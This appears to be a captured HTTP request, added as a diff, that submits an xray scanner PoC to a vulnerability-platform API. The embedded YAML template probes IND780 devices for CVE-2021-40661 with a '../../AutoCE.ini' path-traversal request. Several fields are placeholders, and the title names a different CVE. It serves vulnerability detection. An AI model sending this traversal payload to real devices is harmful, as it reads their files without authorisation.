@@ -1,0 +1,21 @@
+POST /api/v2/xray/poc/create/ HTTP/1.1
+Host: stack.chaitin.com
+Content-Length: 856
+Sec-Ch-Ua: "Not:A-Brand";v="99", "Chromium";v="112"
+Content-Type: application/json
+Sec-Ch-Ua-Mobile: ?0
+X-Canvas-Fingerprint: df7110617732f60831feb284e040594e
+X-Csrftoken: LAJbNjklMOillZLgAuv0dOnbBr1ujw2fIx2XcZialkBsYRdVHneTh6ZEE9Cx04nb
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.50 Safari/537.36
+Sec-Ch-Ua-Platform: "Windows"
+Accept: */*
+Origin: https://stack.chaitin.com
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://stack.chaitin.com/poc/editor
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Connection: close
+
+{"title":"cisco-small-business-cve-2019-1943-redirect","loophole_finger":1,"protocol":"11","manufacturer":"22","product_name":"33","risk_level":3,"detect_env":"linux","notes":"test~~~\n\n![](https://ctstack-oss.oss-cn-beijing.aliyuncs.com/challenge/766df2770cfd3e3c1199a1858433f573.jpg)\n\n## 11111","code":"name: poc-yaml-ind780-cve-2021-40661-lfi\r\ntransport: http\r\nrules:\r\n  r0:\r\n    request:\r\n      method: GET\r\n      path: /IND780/excalweb.dll?webpage=../../AutoCE.ini\r\n      follow_redirects: false\r\n    expression: >-\r\n      response.status == 200 && response.body_string.contains(\"ExePath=\\\\Windows\") && response.body_string.contains(\"WorkDir=\\\\Windows\") && response.content_type.contains(\"text/html\")\r\nexpression: r0()\r\ndetail:\r\n  author: 小z\r\n  links:\r\n    - https://nvd.nist.gov/vuln/detail/CVE-2021-40661"}
